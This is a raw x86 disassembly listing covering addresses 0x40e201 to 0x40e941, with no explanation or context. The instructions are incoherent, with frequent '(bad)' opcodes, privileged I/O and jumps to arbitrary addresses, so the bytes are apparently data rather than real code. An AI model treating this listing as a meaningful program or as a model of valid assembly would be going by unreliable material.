  40e201:	jnp    0x40e19c
  40e203:	jecxz  0x40e265
  40e205:	inc    ecx
  40e206:	add    DWORD PTR [edi],0xffffffd7
  40e209:	xchg   edx,eax
  40e20a:	fidivr WORD PTR [edi-0x1a]
  40e20d:	mov    ebp,0x3f91ed28
  40e212:	mov    DWORD PTR [ecx-0x3a],0xeab81f67
  40e219:	in     eax,dx
  40e21a:	pop    ebx
  40e21b:	xchg   edx,eax
  40e21c:	push   esp
  40e21d:	xchg   DWORD PTR [ecx+0x29],ebp
  40e220:	mov    cl,cl
  40e222:	mov    ch,0xf9
  40e224:	cld    
  40e225:	out    0x39,eax
  40e227:	popf   
  40e228:	int    0xae
  40e22a:	xchg   esi,eax
  40e22b:	pop    esi
  40e22c:	push   edx
  40e22d:	repnz mov dl,0xe0
  40e230:	lea    edx,[eax+0x37]
  40e233:	cdq    
  40e234:	sti    
  40e235:	mov    ah,0xed
  40e237:	outs   dx,BYTE PTR ds:[esi]
  40e238:	adc    BYTE PTR [ecx],dh
  40e23a:	jp     0x40e21f
  40e23c:	icebp  
  40e23d:	and    al,0x5e
  40e23f:	sbb    ecx,DWORD PTR [ebx-0x67]
  40e242:	js     0x40e258
  40e244:	mov    cl,0x96
  40e246:	inc    ebp
  40e247:	iret   
  40e248:	or     BYTE PTR [edx+0x1a],bh
  40e24b:	add    dl,bl
  40e24d:	sbb    al,0x9f
  40e24f:	push   edx
  40e250:	imul   esp,DWORD PTR [ecx-0x2],0x71c9a708
  40e257:	xchg   BYTE PTR [esi+0x5f20625f],bl
  40e25d:	pop    ss
  40e25e:	mov    eax,0x371a3091
  40e263:	mov    ds:0x5bc0c941,eax
  40e268:	nop
  40e269:	dec    ebp
  40e26a:	xor    BYTE PTR [edx+ebx*2],cl
  40e26d:	mov    dl,BYTE PTR [edx]
  40e26f:	xor    BYTE PTR [edi-0x38],al
  40e272:	aaa    
  40e273:	pop    edi
  40e274:	icebp  
  40e275:	xor    bl,ch
  40e277:	arpl   WORD PTR [ebp+0x6b],cx
  40e27a:	ins    BYTE PTR es:[edi],dx
  40e27b:	fimul  DWORD PTR [eax+0x22]
  40e27e:	dec    esp
  40e27f:	push   0x1a
  40e281:	loopne 0x40e28f
  40e283:	inc    ebx
  40e284:	xchg   esi,eax
  40e285:	mov    cl,0xa7
  40e287:	pushf  
  40e288:	sub    eax,0xf2c5801c
  40e28d:	mov    al,0x37
  40e28f:	(bad)  
  40e290:	cmp    bl,dl
  40e292:	adc    bl,bh
  40e294:	push   DWORD PTR [esi]
  40e296:	pushf  
  40e297:	jmp    0x1bad06a9
  40e29c:	push   ebp
  40e29d:	dec    edx
  40e29e:	cwde   
  40e29f:	xchg   DWORD PTR [ecx],eax
  40e2a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2a2:	loop   0x40e273
  40e2a4:	in     al,dx
  40e2a5:	add    ebp,DWORD PTR [edi+0x32d29681]
  40e2ab:	mov    edx,0x5686ab25
  40e2b0:	and    eax,0xb1bbb43e
  40e2b5:	dec    ebp
  40e2b6:	jmp    0x4f0cd453
  40e2bb:	daa    
  40e2bc:	test   BYTE PTR [edx-0x17],ch
  40e2bf:	jmp    0x40e32f
  40e2c1:	outs   dx,BYTE PTR ds:[esi]
  40e2c2:	inc    edx
  40e2c3:	jae    0x40e325
  40e2c5:	shl    BYTE PTR [esi+0x64f1c2],1
  40e2cb:	je     0x40e310
  40e2cd:	cmp    BYTE PTR [eax+0x1f],ah
  40e2d0:	sub    BYTE PTR [ebx-0x25],cl
  40e2d3:	fcom   DWORD PTR [ebp+0x31]
  40e2d6:	jno    0x40e323
  40e2d8:	pop    ebp
  40e2d9:	mov    edx,DWORD PTR [ecx+0x5f]
  40e2dc:	div    DWORD PTR [ebp-0x17]
  40e2df:	mov    bh,0x20
  40e2e1:	and    BYTE PTR [esi-0x544ca595],al
  40e2e7:	shr    eax,0xd4
  40e2ea:	scas   eax,DWORD PTR es:[edi]
  40e2eb:	cmp    esp,DWORD PTR [esi+0x77]
  40e2ee:	xchg   edi,eax
  40e2ef:	jle    0x40e2dc
  40e2f1:	xchg   esp,eax
  40e2f2:	repnz rcr esi,cl
  40e2f5:	mov    bh,0xd2
  40e2f7:	pop    ebx
  40e2f8:	pop    esi
  40e2f9:	sub    BYTE PTR [ecx],bh
  40e2fb:	ss sub eax,0x9da25081
  40e301:	push   ebp
  40e302:	test   eax,0x67f5b243
  40e307:	popa   
  40e308:	int3   
  40e309:	sbb    al,0x18
  40e30b:	inc    ebp
  40e30c:	stos   BYTE PTR es:[edi],al
  40e30d:	(bad)  
  40e30e:	jmp    0x40e378
  40e310:	in     eax,0xbe
  40e312:	loop   0x40e37c
  40e314:	mov    ah,0xfd
  40e316:	adc    ecx,DWORD PTR [ebx+0x42]
  40e319:	js     0x40e31b
  40e31b:	(bad)
  40e31e:	inc    ebp
  40e31f:	mov    ecx,DWORD PTR [eax+0x67edef6]
  40e325:	sub    dl,BYTE PTR [ebx]
  40e327:	mov    bl,0xb2
  40e329:	mov    cl,0x3d
  40e32b:	lds    ebx,FWORD PTR [edi-0x44b20eb5]
  40e331:	jne    0x40e339
  40e333:	xchg   esp,eax
  40e334:	mov    esp,0x3da78806
  40e339:	cmc    
  40e33a:	add    bh,BYTE PTR [eax+0x45]
  40e33d:	into   
  40e33e:	xchg   esp,eax
  40e33f:	jnp    0x40e3aa
  40e341:	xchg   BYTE PTR [ebx+eiz*1],dh
  40e344:	jmp    0x1fee:0x4c2fcfc3
  40e34b:	jmp    0xe7e2:0x30d9a08f
  40e352:	cmp    DWORD PTR [ebp-0x1c],eax
  40e355:	cmp    BYTE PTR [ebx],al
  40e357:	xchg   edi,eax
  40e358:	sub    al,0x27
  40e35a:	cs imul ah
  40e35d:	xchg   ebx,eax
  40e35e:	and    DWORD PTR [ebx],edx
  40e360:	lea    esi,[ebx-0x2e3ee462]
  40e366:	add    dl,BYTE PTR [esi-0x2c]
  40e369:	push   ebp
  40e36a:	ficom  DWORD PTR [esi-0x4b]
  40e36d:	xor    BYTE PTR [esi],bh
  40e36f:	inc    edi
  40e370:	icebp  
  40e371:	push   eax
  40e372:	(bad)  
  40e373:	(bad)  
  40e374:	push   ss
  40e375:	and    edx,esp
  40e377:	js     0x40e303
  40e379:	cdq    
  40e37a:	pop    ecx
  40e37b:	xchg   ebx,eax
  40e37c:	push   edi
  40e37d:	fsub   DWORD PTR [esi+0x3c]
  40e380:	call   0xaf191e1c
  40e385:	popw   ds
  40e387:	pop    esi
  40e388:	aad    0xd1
  40e38a:	mov    eax,ds:0x2c24ade1
  40e38f:	add    BYTE PTR [eax+0x3b],0x1b
  40e393:	(bad)  
  40e394:	not    BYTE PTR [edi+0x28]
  40e397:	arpl   WORD PTR [eax+0x3c9dc871],si
  40e39d:	add    eax,0xadea78c2
  40e3a2:	inc    edx
  40e3a3:	mov    cl,0x76
  40e3a5:	ret    0x204c
  40e3a8:	inc    esi
  40e3a9:	(bad)  
  40e3aa:	nop
  40e3ab:	scas   al,BYTE PTR es:[edi]
  40e3ac:	fscale 
  40e3ae:	(bad)  
  40e3af:	in     eax,dx
  40e3b0:	add    WORD PTR [esi-0x22],bx
  40e3b4:	inc    esp
  40e3b5:	in     eax,0x1
  40e3b7:	dec    eax
  40e3b8:	mov    eax,ds:0xa869a2e6
  40e3bd:	cmp    DWORD PTR [esi+0x7d],edx
  40e3c0:	cmp    cl,BYTE PTR [esi+0x46]
  40e3c3:	in     al,0xa5
  40e3c5:	(bad)  
  40e3c6:	fisttp WORD PTR [esi-0x2]
  40e3c9:	dec    edx
  40e3ca:	sar    DWORD PTR [edx],0x83
  40e3cd:	jmp    0x40e3c3
  40e3cf:	clc    
  40e3d0:	push   cs
  40e3d1:	mov    dh,0xf3
  40e3d3:	and    ebp,ebp
  40e3d5:	cmc    
  40e3d6:	in     eax,dx
  40e3d7:	inc    ecx
  40e3d8:	and    ah,dh
  40e3da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3db:	outs   dx,DWORD PTR ds:[esi]
  40e3dc:	inc    eax
  40e3dd:	test   DWORD PTR [edx],ebp
  40e3df:	clc    
  40e3e0:	popa   
  40e3e1:	lods   eax,DWORD PTR ds:[esi]
  40e3e2:	ds mov edi,0x9d0a7f1a
  40e3e8:	in     eax,0x7a
  40e3ea:	dec    edx
  40e3eb:	scas   al,BYTE PTR es:[edi]
  40e3ec:	sbb    eax,DWORD PTR [eax+eiz*2]
  40e3ef:	adc    DWORD PTR [eax+edx*2+0x70ca353b],edi
  40e3f6:	xlat   BYTE PTR ds:[ebx]
  40e3f7:	pop    ds
  40e3f8:	push   0xffffffac
  40e3fa:	lahf   
  40e3fb:	imul   edx,DWORD PTR [ebx],0xfffffffa
  40e3fe:	or     eax,0x6833357a
  40e403:	and    al,BYTE PTR [edx+0x2d]
  40e406:	adc    DWORD PTR [edx+0x1d30bd80],0xdd947370
  40e410:	int    0x88
  40e412:	mov    eax,ds:0xac354f92
  40e417:	mov    ah,0x1e
  40e419:	in     eax,dx
  40e41a:	(bad)  
  40e41b:	into   
  40e41c:	mov    edx,DWORD PTR [ebp+0x15ccbb98]
  40e422:	mov    ebx,0x9f741491
  40e427:	push   es
  40e428:	inc    esp
  40e429:	xlat   BYTE PTR ds:[ebx]
  40e42a:	(bad)  
  40e42b:	popa   
  40e42c:	push   esp
  40e42d:	push   ebx
  40e42e:	mov    edx,0xe0da0f02
  40e433:	push   ds
  40e434:	inc    ebp
  40e435:	cmp    esi,ebx
  40e437:	dec    esp
  40e438:	je     0x40e423
  40e43a:	call   0xf6a4456b
  40e43f:	outs   dx,BYTE PTR ds:[esi]
  40e440:	ret    0xa1d3
  40e443:	iret   
  40e444:	push   ecx
  40e445:	inc    DWORD PTR [esi]
  40e447:	pop    ebp
  40e448:	lods   eax,DWORD PTR ds:[esi]
  40e449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e44a:	js     0x40e474
  40e44c:	mov    al,0xd7
  40e44e:	aam    0x1
  40e450:	cs xor eax,0x79e8a171
  40e456:	aaa    
  40e457:	cmp    DWORD PTR [ebx],ecx
  40e459:	outs   dx,DWORD PTR ds:[esi]
  40e45a:	xchg   DWORD PTR [eax+0x15e01275],ecx
  40e460:	push   esi
  40e461:	mov    cl,0xcf
  40e463:	inc    edx
  40e464:	xor    al,dl
  40e466:	adc    eax,0x1b68ee28
  40e46b:	repz je 0x40e417
  40e46e:	push   0xf48583d
  40e473:	js     0x40e46b
  40e475:	or     eax,ebx
  40e477:	push   cs
  40e478:	push   ebx
  40e479:	mov    ds:0xa81b18c3,eax
  40e47e:	mov    gs,edx
  40e480:	fistp  DWORD PTR [edi-0x435c01d8]
  40e486:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e487:	idiv   BYTE PTR [ecx+edi*1+0x64]
  40e48b:	hlt    
  40e48c:	gs lea esi,fs:[edx-0x78303f3d]
  40e494:	inc    edx
  40e495:	scas   eax,DWORD PTR es:[edi]
  40e496:	mov    ah,0x79
  40e498:	cmp    dl,bl
  40e49a:	out    0x7a,al
  40e49c:	add    al,0xa1
  40e49e:	mov    bh,0x80
  40e4a0:	call   0xf4ef385c
  40e4a5:	or     esp,DWORD PTR [ebp+0x5e]
  40e4a8:	or     BYTE PTR [ebx-0x4d],bl
  40e4ab:	loope  0x40e496
  40e4ad:	xor    eax,0x6e1af28e
  40e4b2:	sub    bl,ch
  40e4b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4b5:	lods   al,BYTE PTR ds:[esi]
  40e4b6:	imul   edx,DWORD PTR [esp+ebx*4+0x71],0x8b040d23
  40e4be:	repnz loopne 0x40e4df
  40e4c1:	stos   DWORD PTR es:[edi],eax
  40e4c2:	(bad)  
  40e4c3:	out    dx,eax
  40e4c4:	sbb    eax,0x489aaacf
  40e4c9:	lock shl DWORD PTR [esi-0x5ff0202d],1
  40e4d0:	cmp    al,0xbc
  40e4d2:	jecxz  0x40e4f7
  40e4d4:	out    0x78,eax
  40e4d6:	push   ecx
  40e4d7:	shr    BYTE PTR [ebp+0x50],cl
  40e4da:	(bad)  
  40e4db:	rcr    DWORD PTR [eax+0x14],1
  40e4de:	imul   edi,DWORD PTR [ebp+0x30652af3],0xffffffe5
  40e4e5:	mov    esp,0x9fbaadc1
  40e4ea:	mov    dl,0x2d
  40e4ec:	icebp  
  40e4ed:	shr    BYTE PTR [edx+0x13],0xc7
  40e4f1:	outs   dx,BYTE PTR ds:[esi]
  40e4f2:	add    DWORD PTR [edx+0x4f],edx
  40e4f5:	lahf   
  40e4f6:	je     0x40e493
  40e4f8:	dec    ebx
  40e4f9:	lods   eax,DWORD PTR ds:[esi]
  40e4fa:	jecxz  0x40e513
  40e4fc:	mov    esi,0x87d7630a
  40e501:	mov    ah,0x7e
  40e503:	sbb    al,0x9f
  40e505:	and    esp,DWORD PTR [eax+0x37ae9c29]
  40e50b:	push   0x496cb48b
  40e510:	fisttp DWORD PTR ss:[eax]
  40e513:	test   edi,0xd148b793
  40e519:	inc    edx
  40e51a:	dec    edx
  40e51b:	jmp    0x40e57e
  40e51d:	xsavec [ecx-0x6b0ba3d6]
  40e524:	ss in  al,dx
  40e526:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e527:	mov    al,ds:0x6e542416
  40e52c:	loope  0x40e4bd
  40e52e:	sub    al,0x2f
  40e530:	cmp    dh,bl
  40e532:	mov    edi,0x382244e4
  40e537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e538:	popa   
  40e539:	inc    esi
  40e53a:	fisub  DWORD PTR [eax-0x39]
  40e53d:	xor    DWORD PTR [edx+0x79],ecx
  40e540:	int3   
  40e541:	shr    BYTE PTR [esi],0x1c
  40e544:	out    0xf3,al
  40e546:	dec    ebp
  40e547:	mov    DWORD PTR [ecx-0x2cc0afea],ecx
  40e54d:	push   ds
  40e54e:	sar    BYTE PTR [ebx-0x70f882f],1
  40e554:	cld    
  40e555:	out    dx,eax
  40e556:	xchg   DWORD PTR [ebp-0xa410e9d],esp
  40e55c:	mov    esi,0xd8c746c4
  40e561:	jle    0x40e55d
  40e563:	mov    WORD PTR [esi+ebx*1],cs
  40e566:	pop    esp
  40e567:	outs   dx,BYTE PTR ds:[esi]
  40e568:	ficomp WORD PTR [ebp+edx*8+0x7]
  40e56c:	pop    ebp
  40e56d:	dec    ecx
  40e56f:	sub    BYTE PTR [esp+esi*1-0x37],bh
  40e573:	pop    esi
  40e574:	leave  
  40e575:	adc    BYTE PTR [eax],cl
  40e577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e578:	rcr    DWORD PTR [edi-0x43b91323],0x28
  40e57f:	jmp    0xf0ee9f62
  40e584:	sub    dh,BYTE PTR [esp+edi*1]
  40e587:	cwde   
  40e588:	fisttp QWORD PTR [edi+0x61]
  40e58b:	out    0xf9,eax
  40e58d:	mov    ebx,0xc63d94ad
  40e592:	shl    DWORD PTR [ebp+0x4e],1
  40e595:	add    DWORD PTR [ebx-0x272f8c5b],esp
  40e59b:	std    
  40e59c:	xchg   ebx,eax
  40e59d:	inc    esp
  40e59e:	sbb    BYTE PTR [eax+0x7d],dh
  40e5a1:	mov    dh,0x1f
  40e5a3:	test   al,0xda
  40e5a5:	inc    edx
  40e5a6:	movaps XMMWORD PTR [bx+di],xmm4
  40e5aa:	or     DWORD PTR [edx+edi*1+0x166becf6],ebp
  40e5b1:	mov    al,0x9
  40e5b3:	add    dh,BYTE PTR [esi]
  40e5b5:	imul   esp,DWORD PTR [ebx-0x38],0xffffffd0
  40e5b9:	xor    eax,0x1c2e8555
  40e5be:	sub    BYTE PTR [ecx],cl
  40e5c0:	and    BYTE PTR [edi+0x6bca8f61],0xb
  40e5c7:	push   esp
  40e5c8:	cmc    
  40e5c9:	xchg   esp,eax
  40e5ca:	retf   
  40e5cb:	pop    esp
  40e5cc:	push   edx
  40e5cd:	mov    cs,WORD PTR [ecx+0x177a43e0]
  40e5d3:	pop    ecx
  40e5d4:	icebp  
  40e5d5:	xchg   BYTE PTR [edx-0x45],al
  40e5d8:	mov    dh,0x4
  40e5da:	mov    ah,BYTE PTR [ecx+0x71a6dea]
  40e5e0:	jp     0x33b12dca
  40e5e6:	pop    es
  40e5e7:	mov    bh,0xb6
  40e5e9:	ret    0x1dbe
  40e5ec:	dec    eax
  40e5ed:	jnp    0x40e66a
  40e5ef:	out    0x51,al
  40e5f1:	jbe    0x40e60e
  40e5f3:	xchg   ebx,eax
  40e5f4:	(bad)  
  40e5f5:	popa   
  40e5f6:	push   es
  40e5f7:	stos   DWORD PTR es:[edi],eax
  40e5f8:	ret    0xbd1b
  40e5fb:	stos   DWORD PTR es:[edi],eax
  40e5fc:	pavgb  mm1,mm6
  40e5ff:	push   ebx
  40e600:	mov    esp,0x39b6d828
  40e605:	loope  0x40e613
  40e607:	mov    edx,0xe788638
  40e60c:	or     edi,DWORD PTR [edi]
  40e60e:	mov    WORD PTR [esi-0x4e],ss
  40e611:	aad    0x5c
  40e613:	inc    eax
  40e614:	inc    eax
  40e615:	retf   
  40e616:	push   cs
  40e617:	xchg   esp,eax
  40e618:	rcr    DWORD PTR ds:0x6e91e390,1
  40e61e:	pop    ss
  40e61f:	xor    DWORD PTR ds:0xd4ddf572,ebp
  40e625:	jno    0x40e61c
  40e627:	sub    al,0xf6
  40e629:	pop    esp
  40e62a:	test   DWORD PTR ds:0x5d68bbc9,ebx
  40e630:	pop    es
  40e631:	ja     0x40e689
  40e633:	add    ah,BYTE PTR [esi]
  40e635:	out    dx,al
  40e636:	jmp    0xc872:0x5f2f2a3b
  40e63d:	pop    ecx
  40e63e:	inc    eax
  40e63f:	stc    
  40e640:	push   ebx
  40e641:	pushf  
  40e642:	pop    edi
  40e643:	and    DWORD PTR [edx],ecx
  40e645:	jne    0x40e63d
  40e647:	and    DWORD PTR [esi],esi
  40e649:	jno    0x40e61b
  40e64b:	in     eax,0x65
  40e64d:	adc    dh,cl
  40e64f:	retf   
  40e650:	fimul  DWORD PTR [esi+0x581948b9]
  40e656:	add    eax,0xbedb1e1a
  40e65b:	or     ebp,esi
  40e65d:	and    BYTE PTR [ecx-0xd6399fd],0x60
  40e664:	jnp    0x40e6d0
  40e666:	inc    edi
  40e667:	push   cs
  40e668:	inc    ebx
  40e669:	or     al,0xbb
  40e66b:	sbb    DWORD PTR [ebx],ecx
  40e66d:	call   0xe4a8:0x83a4db24
  40e674:	xor    ebp,DWORD PTR [ecx+0x5df7cac6]
  40e67a:	sbb    cl,BYTE PTR [ecx-0x26bba8f]
  40e680:	xor    DWORD PTR [edi],ecx
  40e682:	sti    
  40e683:	(bad)  
  40e684:	cmp    ecx,DWORD PTR [esp+ebp*1]
  40e687:	ins    BYTE PTR es:[edi],dx
  40e688:	sbb    al,0x77
  40e68a:	dec    ecx
  40e68b:	mov    al,0xdc
  40e68d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e68e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e68f:	sub    al,BYTE PTR [ebx+0x72ccc740]
  40e695:	jb     0x40e63e
  40e697:	mov    edi,0x56877817
  40e69c:	xchg   ebx,eax
  40e69d:	inc    esp
  40e69e:	adc    DWORD PTR [edx+0xf2ee646],esp
  40e6a4:	fcomp  DWORD PTR [ecx+ebp*2-0x4]
  40e6a8:	lods   al,BYTE PTR ds:[esi]
  40e6a9:	sub    DWORD PTR [esi],esi
  40e6ab:	xchg   edx,eax
  40e6ac:	lea    esi,[eax+0x2c]
  40e6af:	push   ss
  40e6b0:	int    0x12
  40e6b2:	adc    DWORD PTR [ecx+eiz*8],esi
  40e6b5:	mov    eax,ds:0xc3124274
  40e6ba:	jp     0x40e693
  40e6bc:	int    0x8
  40e6be:	mov    ebp,0xbb5bc381
  40e6c3:	popf   
  40e6c4:	sub    ebx,DWORD PTR [ecx+0xa]
  40e6c7:	adc    DWORD PTR [ecx+0x3e],0xbf4e04a2
  40e6ce:	cmp    eax,DWORD PTR [ebp+0x55d3fee1]
  40e6d4:	lock and BYTE PTR [esi+0xefeb8aa],cl
  40e6db:	inc    esi
  40e6dc:	(bad)
  40e6e0:	(bad)  
  40e6e1:	cmp    eax,DWORD PTR [ebp+0x62]
  40e6e4:	shl    BYTE PTR [esi+0x4ab776b3],cl
  40e6ea:	and    cl,BYTE PTR [esi]
  40e6ec:	sbb    BYTE PTR [ecx],0xd5
  40e6ef:	mov    edx,0x4ff8472d
  40e6f4:	mov    esi,0x3125d038
  40e6f9:	dec    ebx
  40e6fa:	out    0x5,eax
  40e6fc:	out    0x42,eax
  40e6fe:	mov    ebp,0xfcc24227
  40e703:	lds    edi,FWORD PTR [edi+edx*2-0x1f920522]
  40e70a:	mov    ebp,0x6b50f827
  40e70f:	xchg   ecx,eax
  40e710:	stos   BYTE PTR es:[edi],al
  40e711:	cmc    
  40e712:	pop    esp
  40e713:	pop    ds
  40e714:	dec    edi
  40e715:	push   es
  40e716:	dec    edx
  40e717:	retf   0x4719
  40e71a:	inc    ebx
  40e71b:	rcr    BYTE PTR [edi],0x98
  40e71e:	hlt    
  40e71f:	inc    esp
  40e720:	and    BYTE PTR [ecx-0x69e41542],bh
  40e726:	and    ch,bl
  40e728:	xchg   ebx,eax
  40e729:	or     cl,dl
  40e72b:	mov    esp,0x592e5f7b
  40e730:	and    al,0x4a
  40e732:	jecxz  0x40e759
  40e734:	add    DWORD PTR [ebp+0x58],edi
  40e737:	sub    eax,0x51592867
  40e73c:	inc    esi
  40e73d:	mov    ds:0x9891d4db,eax
  40e742:	pop    ebp
  40e743:	sub    bl,BYTE PTR [eax+eiz*8-0x75]
  40e747:	nop
  40e748:	sbb    ah,BYTE PTR [ebx]
  40e74a:	inc    esp
  40e74b:	xchg   edi,eax
  40e74c:	bound  edx,QWORD PTR [ebx+0x79583080]
  40e752:	sbb    edi,edx
  40e754:	jp     0x40e7a2
  40e756:	sub    al,0xef
  40e758:	add    DWORD PTR [edx-0x8c124aa],edi
  40e75e:	adc    bl,BYTE PTR [ebp+0x31a2d73b]
  40e764:	cmp    DWORD PTR [ecx+0x6e],edx
  40e767:	mov    ecx,0xae1f6b81
  40e76c:	jge    0x40e73c
  40e76e:	imul   edi,DWORD PTR [ebp-0x10]
  40e772:	xchg   ecx,eax
  40e773:	or     eax,0x5f1414f4
  40e778:	gs dec esi
  40e77a:	mov    al,0x1d
  40e77c:	dec    edx
  40e77d:	jo     0x40e727
  40e77f:	jno    0x40e79a
  40e781:	dec    ebx
  40e782:	cld    
  40e783:	jae    0x40e74c
  40e785:	ins    DWORD PTR es:[edi],dx
  40e786:	jg     0x40e7b2
  40e788:	xchg   edi,eax
  40e789:	mov    ebx,DWORD PTR [esi+0x73]
  40e78c:	aam    0xdc
  40e78e:	aad    0x8
  40e790:	popf   
  40e791:	lds    edx,FWORD PTR [esi+esi*1-0x7b]
  40e795:	bound  ecx,QWORD PTR [ecx+0x10585e9b]
  40e79b:	or     edi,DWORD PTR [ebp-0x6266d579]
  40e7a1:	fmul   QWORD PTR [ebx-0x5b]
  40e7a4:	cli    
  40e7a5:	imul   ebp,DWORD PTR [eiz*1+0x10e4791a],0x2757a47d
  40e7b0:	pop    ds
  40e7b1:	fist   WORD PTR [eax]
  40e7b3:	loop   0x40e79a
  40e7b5:	and    al,0xc2
  40e7b7:	repnz adc eax,0x2524684a
  40e7bd:	pop    ebp
  40e7be:	(bad)
  40e7c1:	push   ebp
  40e7c2:	xor    BYTE PTR [edx+0x25b2ca7b],ah
  40e7c8:	and    al,0xc4
  40e7ca:	retf   
  40e7cb:	jbe    0x40e824
  40e7cd:	stos   DWORD PTR es:[edi],eax
  40e7ce:	mov    ebx,0x85906611
  40e7d3:	sub    eax,0xf175a69d
  40e7d8:	ins    BYTE PTR es:[edi],dx
  40e7d9:	pop    ebp
  40e7da:	push   ebp
  40e7db:	mov    WORD PTR [ebx],es
  40e7dd:	jns    0x40e84e
  40e7df:	sar    BYTE PTR [esi],cl
  40e7e1:	icebp  
  40e7e2:	and    ecx,DWORD PTR [ebp-0x791527fc]
  40e7e8:	repnz xor al,0x99
  40e7eb:	xchg   esp,eax
  40e7ec:	sub    dl,bh
  40e7ee:	dec    ebp
  40e7ef:	mov    bl,BYTE PTR [ebx-0x37]
  40e7f2:	push   eax
  40e7f3:	shl    DWORD PTR [ebp+ebp*2+0x30],1
  40e7f7:	retf   
  40e7f8:	mov    dl,BYTE PTR [ebp-0x66c31d55]
  40e7fe:	add    cl,ah
  40e800:	pmovmskb esp,mm1
  40e803:	add    cl,BYTE PTR [esi]
  40e805:	dec    BYTE PTR [ebx+edx*1+0x41afacf2]
  40e80c:	sbb    BYTE PTR [eax-0x45ca0773],dh
  40e812:	cmp    DWORD PTR [eax+0x61],edx
  40e815:	bound  ebp,QWORD PTR [ecx+0x76]
  40e818:	xchg   ebp,eax
  40e819:	cmp    dl,0x48
  40e81c:	gs int 0xb
  40e81f:	aam    0xae
  40e821:	xor    al,BYTE PTR [ecx+0x2d]
  40e824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e825:	xor    al,0xbd
  40e827:	push   edi
  40e828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e829:	jnp    0x40e7d0
  40e82b:	bound  ebp,QWORD PTR [esi-0x32b0829c]
  40e831:	and    BYTE PTR [ebp-0x2e523bfc],ah
  40e837:	adc    esi,DWORD PTR [eax]
  40e839:	xchg   edx,eax
  40e83a:	shr    BYTE PTR [edi],1
  40e83c:	stos   BYTE PTR es:[edi],al
  40e83d:	or     esp,DWORD PTR [ebx]
  40e83f:	mov    edx,0xc5d765a8
  40e844:	arpl   bx,dx
  40e846:	lods   eax,DWORD PTR ds:[esi]
  40e847:	out    dx,al
  40e848:	enter  0xf37e,0xac
  40e84c:	xchg   esp,eax
  40e84d:	mov    ds:0x66552711,eax
  40e852:	pop    ss
  40e853:	mov    dl,0xa5
  40e855:	xchg   BYTE PTR [esp+edi*4+0xfe0f9a8],dl
  40e85c:	mov    esp,0xd604b791
  40e861:	dec    ecx
  40e862:	out    0x3b,al
  40e864:	pop    es
  40e865:	jae    0x40e82f
  40e867:	out    dx,eax
  40e868:	or     al,0x8e
  40e86a:	adc    ch,BYTE PTR [eax-0x75]
  40e86d:	mov    ebx,0x314470b
  40e872:	ret    0x9131
  40e875:	sar    DWORD PTR ds:0xb53c7a5d,1
  40e87b:	mov    bl,BYTE PTR [ebx+ecx*2+0x4e]
  40e87f:	push   es
  40e880:	out    0xbe,al
  40e882:	lods   al,BYTE PTR ds:[esi]
  40e883:	js     0x40e891
  40e885:	es pop ss
  40e887:	xchg   ebp,eax
  40e888:	cmp    al,0x9f
  40e88a:	xchg   esp,eax
  40e88b:	es es aam 0x55
  40e88f:	adc    DWORD PTR [eax-0x6c639961],ebx
  40e895:	mov    cl,0x21
  40e897:	cli    
  40e898:	popa   
  40e899:	(bad)  
  40e89a:	pusha  
  40e89b:	cli    
  40e89c:	push   ds
  40e89d:	es es dec esi
  40e8a0:	outs   dx,BYTE PTR ds:[esi]
  40e8a1:	(bad)  
  40e8a2:	popa   
  40e8a3:	or     esp,0x8f9cd120
  40e8a9:	test   DWORD PTR es:[esi+0x72],edx
  40e8ad:	adc    esi,esp
  40e8af:	imul   ebx,DWORD PTR [edi+0x30],0xffffff82
  40e8b3:	and    DWORD PTR [ecx+0x6b552c7f],ecx
  40e8b9:	cmp    cl,cl
  40e8bb:	stc    
  40e8bc:	test   BYTE PTR [ecx-0x6c],dh
  40e8bf:	and    BYTE PTR [esp+eax*2-0x7f],dh
  40e8c3:	test   esp,ebp
  40e8c5:	adc    edi,edx
  40e8c7:	dec    edi
  40e8c8:	mov    esi,0xb6601fdb
  40e8cd:	push   edi
  40e8ce:	pop    edx
  40e8cf:	pop    es
  40e8d0:	scas   al,BYTE PTR es:[edi]
  40e8d1:	xchg   edi,eax
  40e8d2:	adc    al,0x18
  40e8d4:	fs inc edx
  40e8d6:	dec    edi
  40e8d7:	in     al,0x74
  40e8d9:	js     0x40e92c
  40e8db:	or     al,BYTE PTR [ebx-0x26]
  40e8de:	out    dx,al
  40e8df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8e0:	fiadd  DWORD PTR [esi]
  40e8e2:	(bad)  
  40e8e3:	cli    
  40e8e4:	xor    eax,0xf37855d8
  40e8e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8ea:	dec    esi
  40e8eb:	mov    eax,ds:0xd5e4b44
  40e8f0:	sbb    BYTE PTR [edi+esi*2],bl
  40e8f3:	ret    0x2b2
  40e8f6:	call   0x2658:0x19732ae0
  40e8fd:	mov    dl,0x8b
  40e8ff:	mov    al,ds:0x4e42d18e
  40e904:	stc    
  40e905:	sub    DWORD PTR [esi-0x7b5de69a],0xb44f97ed
  40e90f:	xor    dl,BYTE PTR [edx+eax*1+0x59]
  40e913:	adc    dl,BYTE PTR [eax]
  40e915:	mov    edi,0x50f08346
  40e91a:	push   esp
  40e91b:	push   es
  40e91c:	inc    ebx
  40e91d:	idiv   BYTE PTR cs:[edi-0x13c9f89d]
  40e924:	push   0xffffffd5
  40e926:	sub    al,0x8f
  40e928:	lock xor al,0x2a
  40e92b:	sti    
  40e92c:	sbb    al,0xe4
  40e92e:	and    ebx,edi
  40e930:	fld    QWORD PTR [ebp+0x61ffff7f]
  40e936:	cwde   
  40e937:	outs   dx,BYTE PTR ds:[esi]
  40e938:	mov    bh,0xe1
  40e93a:	popf   
  40e93b:	mov    eax,ds:0xc12e4c09
  40e940:	pop    ebx
  40e941:	fs data16 xor ch,bl
